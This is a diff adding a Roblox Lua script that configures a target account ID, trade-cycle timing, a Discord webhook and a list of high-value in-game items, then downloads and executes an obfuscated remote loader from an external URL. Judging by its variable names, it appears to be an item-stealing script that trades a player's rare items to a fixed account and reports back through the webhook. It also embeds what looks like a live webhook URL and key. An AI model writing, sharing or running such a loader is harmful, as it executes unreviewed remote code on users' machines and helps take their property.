@@ -1,0 +1,31 @@
+getgenv().SECRET_KEY = "mrr_38a359b4e3f44a16b00e06861ef854ea"
+getgenv().TARGET_ID = 3701604397
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485319683627548842/L8kYUh7l8lf0QFZ5qS0YFlhMHj8jbiVnF5IFtv-kT1_7hzGVlXm85gp-lTP3MwVoPXN0"
+getgenv().TARGET_BRAINROTS = {
+    ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Griffin"] = true,
+    ["Nacho Spyder"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Romantic Grande"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Bacuru and Egguru"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
